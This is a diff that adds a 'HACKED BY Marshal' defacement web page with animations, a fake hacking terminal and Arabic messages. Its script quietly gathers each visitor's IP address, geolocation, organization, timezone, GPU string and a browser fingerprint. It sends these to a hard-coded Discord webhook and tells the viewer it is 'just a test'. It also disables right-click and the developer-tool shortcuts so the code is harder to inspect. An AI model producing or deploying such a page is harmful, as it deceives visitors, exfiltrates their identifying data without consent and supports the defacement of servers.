@@ -1,0 +1,671 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>HACKED BY Marshal</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;600&display=swap');
+    
+    * { 
+      box-sizing: border-box; 
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Orbitron', sans-serif;
+      color: #ffffff;
+      overflow: hidden;
+    }
+    
+    /* Common Screen Styles */
+    .screen {
+      position: fixed;
+      top: 0; 
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      z-index: 1000;
+    }
+    
+    /* Loading Screen */
+    .loading-screen {
+      background: rgba(0, 0, 0, 0.9);
+      backdrop-filter: blur(10px);
+    }
+    
+    .loading-title {
+      font-size: 3.5em;
+      font-weight: 900;
+      margin-bottom: 30px;
+      background: linear-gradient(45deg, #ffffff, #929292, #504b4b, #ffffff);
+      background-size: 400% 400%;
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      animation: colorFlow 3s ease-in-out infinite;
+      text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
+    }
+    
+    .progress-container {
+      width: 400px;
+      height: 25px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 15px;
+      overflow: hidden;
+      margin: 30px 0;
+      border: 2px solid rgba(255, 255, 255, 0.5);
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+    }
+    
+    .progress-bar {
+      width: 0;
+      height: 100%;
+      background: linear-gradient(90deg, #ff0000, #ff0303, #ff0303);
+      animation: fillProgress 12s linear forwards, progressGlow 2s ease-in-out infinite;
+    }
+    
+    .loading-text {
+      font-size: 1.8em;
+      margin-top: 20px;
+      color: #ffffff;
+      text-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
+      animation: textPulse 2s ease-in-out infinite;
+    }
+
+    /* Terminal */
+    .terminal {
+      background: #000000;
+      border: 2px solid #00ff00;
+      border-radius: 10px;
+      padding: 20px;
+      width: 600px;
+      margin-top: 30px;
+      font-family: 'Source Code Pro', monospace;
+      box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+    }
+
+    .terminal-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+      color: #00ff00;
+      font-size: 0.9em;
+    }
+
+    .terminal-dots {
+      display: flex;
+      gap: 5px;
+      margin-right: 15px;
+    }
+
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+
+    .dot.red { background: #ff5f56; }
+    .dot.yellow { background: #ffbd2e; }
+    .dot.green { background: #27ca3f; }
+
+    .terminal-content {
+      color: #00ff00;
+      font-size: 1.1em;
+      line-height: 1.6;
+    }
+
+    .prompt {
+      color: #00ff00;
+      display: inline;
+    }
+
+    .command {
+      color: #ffffff;
+      display: inline;
+    }
+
+    .cursor {
+      background: #00ff00;
+      animation: blink 1s infinite;
+      padding: 0 2px;
+    }
+
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0; }
+    }
+    
+    /* Video Screen */
+    .video-screen {
+      background: black;
+      display: none;
+    }
+    
+    .video-screen video {
+      width: 99vw;
+      height: 99vh;
+      object-fit: cover;
+      border: 3px solid #000000;
+      border-radius: 10px;
+      box-shadow: 0 0 50px rgba(0, 0, 0, 0.7);
+    }
+    
+    /* Hacked Screen - Enhanced */
+    .hacked-screen {
+      background: linear-gradient(45deg, #000000, #1a0000, #000000, #000000);
+      background-size: 400% 400%;
+      animation: backgroundShift 4s ease-in-out infinite;
+      display: none;
+    }
+    
+    .hacked-title {
+      font-size: 5em;
+      font-weight: 900;
+      margin-bottom: 30px;
+      background: linear-gradient(45deg, #ffffff, #949392, #4d4d4b, #ffffff, #777575, #ffffff);
+      background-size: 600% 600%;
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      animation: 
+        rainbowFlow 3s ease-in-out infinite,
+        titleGlow 2s ease-in-out infinite;
+      text-shadow: 0 0 40px rgba(255, 255, 255, 0.9);
+      letter-spacing: 5px;
+    }
+    
+    .hacked-subtitle {
+      font-size: 2em;
+      color: #ffffff;
+      margin-bottom: 40px;
+      animation: 
+        textFlicker 1.5s ease-in-out infinite,
+        subtitleGlow 2.5s ease-in-out infinite;
+      text-shadow: 0 0 20px rgba(221, 230, 221, 0.8);
+      letter-spacing: 3px;
+    }
+    
+    .glitch-effects {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+    }
+    
+    
+    /* Info Screen */
+    .info-screen {
+      background: rgba(0, 0, 0, 0.95);
+      backdrop-filter: blur(15px);
+      display: none;
+      flex-direction: row;
+      gap: 40px;
+    }
+    
+    .info-video-container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .info-video {
+      width: 700px;
+      height: 650px;
+      border: 3px solid #ffffff;
+      border-radius: 15px;
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
+      object-fit: cover;
+    }
+    
+    .info-container {
+      flex: 1;
+      max-width: 600px;
+      padding: 40px;
+      border: 2px solid #ffffff;
+      border-radius: 20px;
+      background: rgba(255, 255, 255, 0.8);
+      box-shadow: 0 0 50px rgba(134, 35, 35, 0.5);
+    }
+    
+    .info-title {
+      font-size: 2.5em;
+      margin-bottom: 30px;
+      color: #000000;
+      text-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
+      animation: titlePulse 3s ease-in-out infinite;
+    }
+    
+    .info-content {
+      font-size: 1.2em;
+      line-height: 1.8;
+      text-shadow: 0 0 10px rgba(0, 0, 0, 0.6);
+      margin-bottom: 30px;
+    }
+    
+    .info-item {
+      margin: 12px 0;
+      padding: 12px;
+      background: rgba(255, 255, 255, 0.1);
+      border-left: 4px solid #ffffff;
+      animation: infoGlow 4s ease-in-out infinite;
+      border-radius: 5px;
+    }
+    
+    .info-label {
+      color: #070707;
+      font-weight: bold;
+      display: inline-block;
+      width: 140px;
+    }
+    
+    .info-value {
+      color: #000000;
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+    }
+    
+    .final-message {
+      font-size: 1.8em;
+      color: #ffffff;
+      text-shadow: 0 0 15px rgba(251, 252, 251, 0.8);
+      animation: finalGlow 2s ease-in-out infinite;
+      margin-top: 20px;
+    }
+    
+    /* Final Screen */
+    .final-screen {
+      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center;
+      background-size: cover;
+      display: none;
+    }
+    
+    .final-message-big {
+      font-size: 4em;
+      font-weight: 900;
+      color: white;
+      text-shadow: 0 0 30px rgba(255, 255, 255, 0.9);
+      animation: finalPulse 3s ease-in-out infinite;
+      letter-spacing: 4px;
+    }
+    
+    /* Animations */
+    @keyframes colorFlow {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
+    
+    @keyframes fillProgress {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+    
+    @keyframes progressGlow {
+      0%, 100% { box-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
+      50% { box-shadow: 0 0 40px rgba(252, 251, 251, 0.9); }
+    }
+    
+    @keyframes textPulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
+    }
+    
+    @keyframes backgroundShift {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
+    
+    @keyframes rainbowFlow {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
+    
+    @keyframes titleGlow {
+      0%, 100% { 
+        text-shadow: 0 0 40px rgba(255, 255, 255, 0.9), 0 0 80px rgba(241, 236, 236, 0.5); 
+      }
+      50% { 
+        text-shadow: 0 0 60px rgb(255, 255, 255), 0 0 120px rgba(255, 255, 255, 0.8); 
+      }
+    }
+    
+    @keyframes textFlicker {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+    
+    @keyframes subtitleGlow {
+      0%, 100% { 
+        text-shadow: 0 0 20px rgba(255, 255, 255, 0.8), 0 0 40px rgba(255, 255, 255, 0.4); 
+      }
+      50% { 
+        text-shadow: 0 0 30px rgb(255, 255, 255), 0 0 60px rgba(250, 250, 250, 0.6); 
+      }
+    }
+    
+    @keyframes glitchScan {
+      0% { transform: translateX(-100%); opacity: 0; }
+      50% { opacity: 1; }
+      100% { transform: translateX(100%); opacity: 0; }
+    }
+    
+    @keyframes titlePulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+    
+    @keyframes infoGlow {
+      0%, 100% { background: rgba(255, 255, 255, 0.1); }
+      50% { background: rgba(255, 255, 255, 0.15); }
+    }
+    
+    @keyframes finalGlow {
+      0%, 100% { 
+        text-shadow: 0 0 15px rgba(255, 255, 255, 0.8), 0 0 30px rgba(248, 248, 248, 0.4); 
+      }
+      50% { 
+        text-shadow: 0 0 25px rgb(255, 255, 255), 0 0 50px rgba(229, 235, 229, 0.6); 
+      }
+    }
+    
+    @keyframes finalPulse {
+      0%, 100% { 
+        transform: scale(1);
+        text-shadow: 0 0 30px rgba(255, 255, 255, 0.9);
+      }
+      50% { 
+        transform: scale(1.1);
+        text-shadow: 0 0 50px rgba(255, 255, 255, 1);
+      }
+    }
+    
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .loading-title, .hacked-title { font-size: 2.5em; }
+      .hacked-subtitle { font-size: 1.5em; }
+      .info-title { font-size: 2em; }
+      .info-content { font-size: 1.1em; }
+      .final-message-big { font-size: 2.5em; }
+      .progress-container { width: 300px; }
+      .terminal { width: 350px; font-size: 0.9em; }
+      .info-screen { flex-direction: column; }
+      .info-video { width: 350px; height: 250px; }
+      .info-container { max-width: 90%; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Background Audio -->
+<audio id="bgAudio" autoplay loop>
+  <source src="https://cdn.discordapp.com/attachments/1372633717520072735/1393795339844059237/voice.mp3?ex=68752150&is=6873cfd0&hm=49d5c21f891fcd0b221c020873bb67a9d04149896347da8533e1bb567c505b03&" type="audio/mpeg">
+</audio>
+
+<!-- Loading Screen -->
+<div class="screen loading-screen" id="loading-screen">
+  <h1 class="loading-title">HACKED BY Marshal</h1>
+  <div class="progress-container">
+    <div class="progress-bar"></div>
+  </div>
+  <p class="loading-text"> الحماية ضعيفه !! </p>
+  
+  <!-- Terminal -->
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="terminal-dots">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+      </div>
+      <span>Terminal</span>
+    </div>
+    <div class="terminal-content">
+      <div><span class="prompt">Marshal@marshal:~$ </span><span class="command" id="terminal-text"></span><span class="cursor"> </span></div>
+    </div>
+  </div>
+</div>
+
+<!-- Video Screen -->
+<div class="screen video-screen" id="video-screen">
+  <video autoplay muted loop>
+    <source src="https://v1.pinimg.com/videos/iht/720p/44/14/68/44146850b8139f87857522a6439435cb.mp4" type="video/mp4">
+  </video>
+</div>
+
+<!-- Hacked Screen -->
+<div class="screen hacked-screen" id="hacked-screen">
+  <div class="glitch-effects">
+    <div class="glitch-line"></div>
+    <div class="glitch-line"></div>
+    <div class="glitch-line"></div>
+  </div>
+  <img src="https://i.postimg.cc/yYfpF8Sr/asf.jpg" class="info-video" alt="">
+  <h1 class="hacked-title">HACKED BY Marshal</h1>
+  <p class="hacked-subtitle">server is hacked</p>
+</div>
+
+<!-- Info Screen -->
+<div class="screen info-screen" id="info-screen">
+  <div class="info-video-container">
+    <video class="info-video" autoplay muted loop>
+      <!-- Add your MP4 source here -->
+       <h1 class="hacked-title">HACKED BY Marshal</h1><br>
+      <source src="https://abo-ali-1.github.io/Marshal/index/ddd.mp4" type="video/mp4">
+      Your browser does not support the video tag.
+    </video>
+  </div>
+  <div class="info-container">
+    <h1 class="info-title">System Information</h1>
+    <div class="info-content">
+      <div class="info-item">
+        <span class="info-label">IP Address:</span>
+        <span class="info-value" id="ip">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">City:</span>
+        <span class="info-value" id="city">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Region:</span>
+        <span class="info-value" id="region">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Country:</span>
+        <span class="info-value" id="country">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Location:</span>
+        <span class="info-value" id="location">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Organization:</span>
+        <span class="info-value" id="organization">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Timezone:</span>
+        <span class="info-value" id="timezone">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">GPU:</span>
+        <span class="info-value" id="gpu">Loading...</span>
+      </div>
+    </div>
+    <div class="final-message">Don't worry - This is just a test</div>
+  </div>
+</div>
+
+<!-- Final Screen -->
+<div class="screen final-screen" id="final-screen">
+  <h1 class="final-message-big">مع كامل تحياتي وأشواقي</h1>
+</div>
+
+<script>
+// Audio setup
+document.addEventListener('DOMContentLoaded', function() {
+  const audio = document.getElementById('bgAudio');
+  audio.volume = 1.0;
+});
+
+// Terminal typing effect
+const commands = [
+  "sudo apt install kill-server",
+  "Initializing attack sequence...",
+  "Hack completed successfully!"
+];
+
+let currentCommand = 0;
+let currentChar = 0;
+
+function typeCommand() {
+  if (currentCommand < commands.length) {
+    const command = commands[currentCommand];
+    if (currentChar < command.length) {
+      document.getElementById('terminal-text').textContent = command.substring(0, currentChar + 1);
+      currentChar++;
+      setTimeout(typeCommand, 100);
+    } else {
+      setTimeout(() => {
+        currentCommand++;
+        currentChar = 0;
+        if (currentCommand < commands.length) {
+          document.getElementById('terminal-text').textContent = '';
+          setTimeout(typeCommand, 500);
+        }
+      }, 1000);
+    }
+  }
+}
+
+// Start typing effect after a delay
+setTimeout(typeCommand, 100);
+
+// Screen transitions with improved timing
+setTimeout(() => {
+  document.getElementById('loading-screen').style.display = 'none';
+  document.getElementById('video-screen').style.display = 'flex';
+}, 13000); // Loading screen: 5 seconds
+
+setTimeout(() => {
+  document.getElementById('video-screen').style.display = 'none';
+  document.getElementById('hacked-screen').style.display = 'flex';
+}, 28000); // Video screen: 15 seconds
+
+setTimeout(() => {
+  document.getElementById('hacked-screen').style.display = 'none';
+  document.getElementById('info-screen').style.display = 'flex';
+}, 35000); // Hacked screen: 10 seconds
+
+// =setTimeout(() => {
+//  = document.getElementById('info-screen').style.display = 'none';
+//= }, 200000); // Info screen: 20 seconds
+//  = document.getElementById('final-screen').style.display = 'flex';
+
+// Fetch and dis=play IP information
+fetch('https://ipinfo.io/json')
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById('ip').textContent = data.ip || 'N/A';
+    document.getElementById('city').textContent = data.city || 'N/A';
+    document.getElementById('region').textContent = data.region || 'N/A';
+    document.getElementById('country').textContent = data.country || 'N/A';
+    document.getElementById('location').textContent = data.loc || 'N/A';
+    document.getElementById('organization').textContent = data.org || 'N/A';
+    document.getElementById('timezone').textContent = data.timezone || 'N/A';
+
+    // Get GPU information
+    let gpuInfo = 'N/A';
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      }
+    } catch(e) {
+      console.log('GPU info not available');
+    }
+    document.getElementById('gpu').textContent = gpuInfo;
+
+    // Create HWID
+    const hwidRaw = [
+      navigator.userAgent,
+      navigator.language,
+      screen.width,
+      screen.height,
+      screen.colorDepth,
+      navigator.platform,
+      gpuInfo
+    ].join("|");
+    const hwid = btoa(hwidRaw);
+    const formattedHWID = hwid.match(/.{1,64}/g)?.join("\n") || hwid;
+
+    // Send to webhook (optional)
+    const webhookUrl = "https://discord.com/api/webhooks/1393783455644385372/KF77l9wWobTFbA5UB8SGRyqqnMaDG5zfNCPds4UpdsvKAq17TVF2Uudi_twAJIYMAL8w";
+    const embed = {
+      title: "📥 New Visitor Entered the Site",
+      color: 16711680,
+      fields: [
+        { name: "🌐 IP", value: data.ip || "N/A", inline: true },
+        { name: "🏙️ City", value: data.city || "N/A", inline: true },
+        { name: "🌍 Country", value: data.country || "N/A", inline: true },
+        { name: "🧭 Region", value: data.region || "N/A", inline: true },
+        { name: "📍 Location", value: data.loc || "N/A", inline: true },
+        { name: "🏢 Organization", value: data.org || "N/A", inline: true },
+        { name: "🕒 Timezone", value: data.timezone || "N/A", inline: true },
+        { name: "🖥️ GPU", value: gpuInfo, inline: true },
+        { name: "🔗 Page", value: window.location.href, inline: false },
+        { name: "🧬 HWID", value: formattedHWID, inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    };
+
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] })
+    }).catch(() => {
+      console.log('Webhook failed - continuing normally');
+    });
+  })
+  .catch(() => {
+    // Fallback if IP service fails
+    document.getElementById('ip').textContent = 'N/A';
+    document.getElementById('city').textContent = 'N/A';
+    document.getElementById('region').textContent = 'N/A';
+    document.getElementById('country').textContent = 'N/A';
+    document.getElementById('location').textContent = 'N/A';
+    document.getElementById('organization').textContent = 'N/A';
+    document.getElementById('timezone').textContent = 'N/A';
+    document.getElementById('gpu').textContent = 'N/A';
+  });
+
+// Prevent right-click context menu
+document.addEventListener('contextmenu', e => e.preventDefault());
+
+// Prevent F12, Ctrl+Shift+I, etc.
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || 
+      (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+      (e.ctrlKey && e.key === 'u')) {
+    e.preventDefault();
+  }
+});
+</script>
+
+</body>
+</html>
